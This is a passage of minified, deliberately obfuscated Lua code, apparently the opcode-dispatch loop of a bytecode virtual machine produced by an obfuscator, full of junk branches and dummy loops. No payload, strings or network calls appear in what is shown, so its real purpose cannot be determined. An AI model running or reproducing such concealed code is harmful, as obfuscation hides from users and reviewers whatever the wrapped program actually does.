c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]]-c[t[l]];else if 91<f then repeat if 93~=f then c[t[e]]=a[t[n]];break;end;for f=0,6 do if 2>=f then if f<1 then c[t[e]]={};r=r+1;t=d[r];else if-3<=f then repeat if f~=1 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;c[t[e]]={};r=r+1;t=d[r];until true;else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end end else if f<=4 then if f~=0 then repeat if 4>f then c[t[e]]={};r=r+1;t=d[r];break;end;c[t[e]]={};r=r+1;t=d[r];until true;else c[t[e]]={};r=r+1;t=d[r];end else if 3~=f then for s=28,55 do if f>5 then c[t[e]]=h[t[n]];break;end;c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end end end end until true;else for f=0,6 do if 2>=f then if f<1 then c[t[e]]={};r=r+1;t=d[r];else if-3<=f then repeat if f~=1 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;c[t[e]]={};r=r+1;t=d[r];until true;else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end end else if f<=4 then if f~=0 then repeat if 4>f then c[t[e]]={};r=r+1;t=d[r];break;end;c[t[e]]={};r=r+1;t=d[r];until true;else c[t[e]]={};r=r+1;t=d[r];end else if 3~=f then for s=28,55 do if f>5 then c[t[e]]=h[t[n]];break;end;c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end end end end end end end end else if f>105 then if 109>f then if 107<=f then if 106<=f then repeat if 108>f then local f;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))break;end;local s;for f=0,6 do if 3<=f then if f<5 then if-1<=f then repeat if f<4 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=a[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=a[t[n]];r=r+1;t=d[r];end else if f>=4 then for h=32,90 do if f~=5 then s=t[e]c[s](c[s+1])break;end;c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];end end else if f<=0 then c[t[e]]();r=r+1;t=d[r];else if f~=0 then for s=23,95 do if 2>f then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end until true;else local s;for f=0,6 do if 3<=f then if f<5 then if-1<=f then repeat if f<4 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=a[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=a[t[n]];r=r+1;t=d[r];end else if f>=4 then for h=32,90 do if f~=5 then s=t[e]c[s](c[s+1])break;end;c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];end end else if f<=0 then c[t[e]]();r=r+1;t=d[r];else if f~=0 then for s=23,95 do if 2>f then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];end else if 110>f then local s,f;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];s=t[e];f=c[t[n]];c[s+1]=f;c[s]=f[t[l]];else if 106<f then repeat if 111~=f then local f,h;f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];break;end;local f,h;f=t[e]c[f](c[f+1])r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];until true;else local f,h;f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];end end end else if 102<f then if 103>=f then c[t[e]]=c[t[n]]/t[l];else if f~=103 then repeat if f~=105 then do return end;break;end;local l;for f=0,1 do if-3<f then repeat if 1~=f then l=t[e]c[l](c[l+1])r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];until true;else l=t[e]c[l](c[l+1])r=r+1;t=d[r];end end until true;else do return end;end end else if 101==f then local o;for f=0,6 do if 2<f then if f>4 then if f>=1 then repeat if f~=6 then c[t[e]]();r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];until true;else c[t[e]]=h[t[n]];end else if 1<f then repeat if f~=4 then o=t[e]c[o](s(c,o+1,t[n]))r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];until true;else o=t[e]c[o](s(c,o+1,t[n]))r=r+1;t=d[r];end end else if 1<=f then if f>-3 then for l=24,74 do if f>1 then c[t[e]]=c[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=a[t[n]];r=r+1;t=d[r];break;end;else c[t[e]]=a[t[n]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end else c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);end end end end end else if 157<=f then if f<168 then if 162<=f then if f<165 then if f>=163 then if 162<=f then repeat if f<164 then c[t[e]]=c[t[n]]*c[t[l]];break;end;for f=0,6 do if 2<f then if 5<=f then if f<6 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c(t[e],t[n]);end else if 3==f then c[t[e]]=h[t[n]];r=r+1;t=d[r];else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end else if 0<f then if-2<f then for h=21,65 do if 2~=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end until true;else for f=0,6 do if 2<f then if 5<=f then if f<6 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c(t[e],t[n]);end else if 3==f then c[t[e]]=h[t[n]];r=r+1;t=d[r];else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end else if 0<f then if-2<f then for h=21,65 do if 2~=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end else for f=0,7 do if f<=3 then if 1>=f then if f<1 then c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end else if f<3 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if f>=6 then if f>=3 then repeat if f<7 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;c[t[e]][t[n]]=c[t[l]];until true;else c[t[e]][t[n]]=c[t[l]];end else if f>3 then for h=48,65 do if 5>f then c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];break;end;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];break;end;else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end end end end end else if f>165 then if 162<=f then for h=13,91 do if f<167 then for f=0,4 do if 1<f then if f>=3 then if 2~=f then repeat if 3~=f then c[t[e]]=c[t[n]][t[l]];break;end;c[t[e]]={};r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];end else c[t[e]]={};r=r+1;t=d[r];end else if f<1 then c[t[e]]={};r=r+1;t=d[r];else c[t[e]]={};r=r+1;t=d[r];end end end break;end;local f,o;for h=0,4 do if 2<=h then if h>2 then if h<4 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else f=t[e]c[f]=c[f](s(c,f+1,t[n]))end else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end else if-3<=h then for s=16,93 do if 1~=h then f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];break;end;c[t[e]]={};r=r+1;t=d[r];break;end;else c[t[e]]={};r=r+1;t=d[r];end end end break;end;else local f,o;for h=0,4 do if 2<=h then if h>2 then if h<4 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else f=t[e]c[f]=c[f](s(c,f+1,t[n]))end else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end else if-3<=h then for s=16,93 do if 1~=h then f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];break;end;c[t[e]]={};r=r+1;t=d[r];break;end;else c[t[e]]={};r=r+1;t=d[r];end end end end else local t=t[e]c[t](s(c,t+1,o))end end else if 158>=f then if f==157 then local f,o;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];else local l;for f=0,1 do if 0~=f then c[t[e]]=h[t[n]];else l=t[e]c[l](c[l+1])r=r+1;t=d[r];end end end else if 160>f then h[t[n]]=c[t[e]];else if 161~=f then local o,s,h;for f=0,5 do if 3>f then if f<1 then c(t[e],t[n]);r=r+1;t=d[r];else if-3~=f then repeat if 1~=f then c(t[e],t[n]);r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]];r=r+1;t=d[r];until true;else c(t[e],t[n]);r=r+1;t=d[r];end end else if 4<=f then if 5==f then if c[t[e]]then r=r+1;else r=t[n];end;else h=t[e]c[h]=c[h](c[h+1])r=r+1;t=d[r];end else o=t[n];s=c[o]for t=o+1,t[l]do s=s..c[t];end;c[t[e]]=s;r=r+1;t=d[r];end end end else local s;for f=0,8 do if 3<f then if f<=5 then if f~=5 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end else if 6>=f then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else if 8==f then c[t[e]]=h[t[n]];else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end end end else if f>=2 then if 2<f then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end else if 1>f then s=t[e]c[s](c[s+1])r=r+1;t=d[r];else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end end end end end end end end else if 174<=f then if 177>f then if 175<=f then if f>174 then for o=30,65 do if 176>f then local f,h;f=t[e]c[f](c[f+1])r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]={};break;end;local s,f;for o=0,4 do if o<2 then if-4<o then repeat if o~=0 then c[t[e]]();r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if 3>o then c[t[e]]=h[t[n]];r=r+1;t=d[r];else if 0<o then repeat if o~=3 then c(t[e],t[n]);break;end;s=t[e];f=c[t[n]];c[s+1]=f;c[s]=f[t[l]];r=r+1;t=d[r];until true;else s=t[e];f=c[t[n]];c[s+1]=f;c[s]=f[t[l]];r=r+1;t=d[r];end end end end break;end;else local f,h;f=t[e]c[f](c[f+1])r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]={};end else local o,a,s,h,f,u,d;local r=0;while r>-1 do if r>=3 then if 5>r then if 2~=r then repeat if r<4 then u=h[o];break;end;d=c[f];for t=1+f,h[s]do d=d..c[t];end;until true;else d=c[f];for t=1+f,h[s]do d=d..c[t];end;end else if 4<r then repeat if r<6 then c[u]=d;break;end;r=-2;until true;else r=-2;end end else if r<=0 then o=e;a=n;s=l;else if r==1 then h=t;else f=h[a];end end end r=r+1 end end else if f<=177 then local o,a,u,b,k,_,p,f;c[t[e]]=h[t[n]];r=r+1;t=d[r];o=t[e];a=c[t[n]];c[o+1]=a;c[o]=a[t[l]];r=r+1;t=d[r];f=0;while f>-1 do if 2<f then if f>4 then if f>5 then f=-2;else c(p,_);end else if f==4 then p=u[b];else _=u[k];end end else if 0>=f then u=t;else if 1<f then k=n;else b=e;end end end f=f+1 end r=r+1;t=d[r];o=t[e]c[o]=c[o](s(c,o+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];do return end;else if f==178 then local a,s,u,d,h,o,f;local r=0;while r>-1 do if r>2 then if r>4 then if 1~=r then for t=29,96 do if r>5 then r=-2;break;end;c[o]=f;break;end;else c[o]=f;end else if r==4 then f=c[h];for t=1+h,d[u]do f=f..c[t];end;else o=d[a];end end else if 0<r then if r>-3 then for c=39,62 do if r<2 then d=t;break;end;h=d[s];break;end;else h=d[s];end else a=e;s=n;u=l;end end r=r+1 end else c[t[e]]={};end end end else if 171<=f then if f>171 then if f==173 then local f,u,a,h;c[t[e]]=c[t[n]];r=r+1;t=d[r];f=t[e]u,a=b(c[f](c[f+1]))o=a+f-1 h=0;for t=f,o do h=h+1;c[t]=u[h];end;r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,o))r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];else local s,b,o,a,u,f,k,_;for f=0,4 do if f>=2 then if 2<f then if f>=-1 then for h=12,63 do if 4>f then k=t[e];_=c[t[n]];c[k+1]=_;c[k]=_[t[l]];r=r+1;t=d[r];break;end;f=0;while f>-1 do if 2<f then if 4>=f then if-1<f then repeat if f<4 then a=s[o];break;end;u=s[b];until true;else a=s[o];end else if 2~=f then repeat if f>5 then f=-2;break;end;c(u,a);until true;else c(u,a);end end else if f<=0 then s=t;else if 0<f then repeat if 2>f then b=e;break;end;o=n;until true;else o=n;end end end f=f+1 end break;end;else f=0;while f>-1 do if 2<f then if 4>=f then if-1<f then repeat if f<4 then a=s[o];break;end;u=s[b];until true;else a=s[o];end else if 2~=f then repeat if f>5 then f=-2;break;end;c(u,a);until true;else c(u,a);end end else if f<=0 then s=t;else if 0<f then repeat if 2>f then b=e;break;end;o=n;until true;else o=n;end end end f=f+1 end end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if f~=-3 then for l=39,57 do if f~=1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;f=0;while f>-1 do if f>=3 then if 5>f then if f>1 then for t=19,81 do if f>3 then u=s[b];break;end;a=s[o];break;end;else a=s[o];end else if f>5 then f=-2;else c(u,a);end end else if 0>=f then s=t;else if 0<f then for t=39,82 do if 2>f then b=e;break;end;o=n;break;end;else o=n;end end end f=f+1 end r=r+1;t=d[r];break;end;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end end else local h,o,u,_,a,b,k,f;for f=0,6 do if f>2 then if f>=5 then if f>4 then repeat if f~=6 then h=t[e];o=c[t[n]];c[h+1]=o;c[h]=o[t[l]];r=r+1;t=d[r];break;end;c(t[e],t[n]);until true;else h=t[e];o=c[t[n]];c[h+1]=o;c[h]=o[t[l]];r=r+1;t=d[r];end else if f~=1 then for l=27,87 do if f>3 then h=t[e]c[h]=c[h](s(c,h+1,t[n]))r=r+1;t=d[r];break;end;f=0;while f>-1 do if 2>=f then if f>0 then if f>-2 then repeat if f~=1 then a=n;break;end;_=e;until true;else a=n;end else u=t;end else if f<5 then if 2<=f then repeat if f<4 then b=u[a];break;end;k=u[_];until true;else b=u[a];end else if 6~=f then c(k,b);else f=-2;end end end f=f+1 end r=r+1;t=d[r];break;end;else f=0;while f>-1 do if 2>=f then if f>0 then if f>-2 then repeat if f~=1 then a=n;break;end;_=e;until true;else a=n;end else u=t;end else if f<5 then if 2<=f then repeat if f<4 then b=u[a];break;end;k=u[_];until true;else b=u[a];end else if 6~=f then c(k,b);else f=-2;end end end f=f+1 end r=r+1;t=d[r];end end else if 1>f then c(t[e],t[n]);r=r+1;t=d[r];else if f==1 then h=t[e]c[h]=c[h](s(c,h+1,t[n]))r=r+1;t=d[r];else h=t[e];o=c[t[n]];c[h+1]=o;c[h]=o[t[l]];r=r+1;t=d[r];end end end end end else if f>=169 then if 168<f then repeat if 170~=f then local e=t[e]local n={c[e](c[e+1])};local r=0;for t=e,t[l]do r=r+1;c[t]=n[r];end break;end;local s,f;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];s=t[e];f=c[t[n]];c[s+1]=f;c[s]=f[t[l]];until true;else local r=t[e]local n={c[r](c[r+1])};local e=0;for t=r,t[l]do e=e+1;c[t]=n[e];end end else local f;for o=0,2 do if 1<=o then if-2<o then repeat if 2>o then f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];until true;else c[t[e]]=h[t[n]];end else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end end end end end end else if 146<=f then if 151>f then if 147>=f then if 143<f then for h=39,89 do if 146~=f then local f,o;for h=0,6 do if 3<=h then if h<=4 then if h==4 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if h>=3 then for s=11,54 do if 5~=h then f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if h<1 then f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];else if 2>h then c(t[e],t[n]);r=r+1;t=d[r];else f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];end end end end break;end;do return c[t[e]]end break;end;else do return c[t[e]]end end else if f>148 then if 150==f then local o,s;for f=0,4 do if f<=1 then if f>=-1 then repeat if 1>f then h[t[n]]=c[t[e]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else h[t[n]]=c[t[e]];r=r+1;t=d[r];end else if 2>=f then c(t[e],t[n]);r=r+1;t=d[r];else if 2~=f then for h=45,98 do if f~=4 then o=t[e];s=c[t[n]];c[o+1]=s;c[o]=s[c[t[l]]];r=r+1;t=d[r];break;end;c(t[e],t[n]);break;end;else c(t[e],t[n]);end end end end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][c[t[n]]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];end else local f,s;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];s=c[t[n]];c[f+1]=s;c[f]=s[t[l]];end end else if f>153 then if 155>f then local f,s;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];s=c[t[n]];c[f+1]=s;c[f]=s[t[l]];else if 156~=f then local nv,g,tv,y,nv,f,a,z,u,rv,m,j,p,k,ev,cv,_;f=0;while f>-1 do if 2<f then if f<5 then if f~=-1 then for t=20,63 do if 3~=f then k=u[g];break;end;y=u[tv];break;end;else y=u[tv];end else if 6==f then f=-2;else c(k,y);end end else if f>=1 then if-1<=f then for t=11,93 do if 2~=f then g=e;break;end;tv=n;break;end;else g=e;end else u=t;end end f=f+1 end r=r+1;t=d[r];a=t[e]c[a]=c[a](s(c,a+1,t[n]))r=r+1;t=d[r];a=t[e];z=c[t[n]];c[a+1]=z;c[a]=z[t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=0;while f>-1 do if 4>f then if f<2 then if 1==f then rv=e;else u=t;end else if f==2 then m=n;else j=c;end end else if 6>f then if f>2 then repeat if f>4 then k=u[rv];break;end;p=j[u[m]];until true;else p=j[u[m]];end else if f>=2 then repeat if 7>f then c[k]=p;break;end;f=-2;until true;else c[k]=p;end end end f=f+1 end r=r+1;t=d[r];a=t[e]ev,cv=b(c[a](c[a+1]))o=cv+a-1 _=0;for t=a,o do _=_+1;c[t]=ev[_];end;r=r+1;t=d[r];a=t[e]c[a](s(c,a+1,o))else if(c[t[e]]==t[l])then r=r+1;else r=t[n];end;end end else if f>=152 then if f~=152 then local f,h;c[t[e]]={};r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))else local s,k,u,a,b,f,o;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=0;while f>-1 do if f>=3 then if 5<=f then if 1<f then repeat if f>5 then f=-2;break;end;c(b,a);until true;else f=-2;end else if f~=1 then repeat if f<4 then a=s[u];break;end;b=s[k];until true;else a=s[u];end end else if f>=1 then if f>1 then u=n;else k=e;end else s=t;end end f=f+1 end r=r+1;t=d[r];o=t[e]c[o]=c[o](c[o+1])r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];end else local o,s;for f=0,6 do if 2>=f then if 0<f then if 2~=f then c[t[e]]=h[t[n]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if 5<=f then if 1<f then for h=33,96 do if 5~=f then o=t[e];s=c[t[n]];c[o+1]=s;c[o]=s[t[l]];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if 3<f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end end end end else if f<140 then if f<=136 then if 134<f then for s=19,73 do if 136~=f then if(c[t[e]]<=t[l])then r=t[n];else r=r+1;end;break;end;local s;for f=0,9 do if 4>=f then if f>1 then if 2<f then if 1~=f then for l=37,88 do if 4>f then s=t[e]c[s]=c[s](c[s+1])r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else c(t[e],t[n]);r=r+1;t=d[r];end else if-4~=f then for s=10,94 do if 0<f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if 7>f then if f>2 then repeat if 6>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];until true;else c(t[e],t[n]);r=r+1;t=d[r];end else if f>7 then if 6~=f then repeat if 9~=f then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];until true;else c[t[e]]=c[t[n]][t[l]];end else s=t[e]c[s]=c[s](c[s+1])r=r+1;t=d[r];end end end end break;end;else if(c[t[e]]<=t[l])then r=t[n];else r=r+1;end;end else if 138<=f then if f>=134 then for h=13,80 do if 139>f then local f,o;for h=0,9 do if 4<h then if h<=6 then if 5<h then f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if 7<h then if h~=5 then for f=14,63 do if h<9 then c[t[e]]={};r=r+1;t=d[r];break;end;c[t[e]][t[n]]=t[l];break;end;else c[t[e]]={};r=r+1;t=d[r];end else c(t[e],t[n]);r=r+1;t=d[r];end end else if h<=1 then if-1<h then for s=48,87 do if 0~=h then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;f=t[e]c[f](c[f+1])r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if h<3 then f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];else if 2<=h then for l=34,66 do if 3~=h then f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];break;end;else f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];end end end end end break;end;local r=t[e];local e=c[t[n]];c[r+1]=e;c[r]=e[t[l]];break;end;else local e=t[e];local 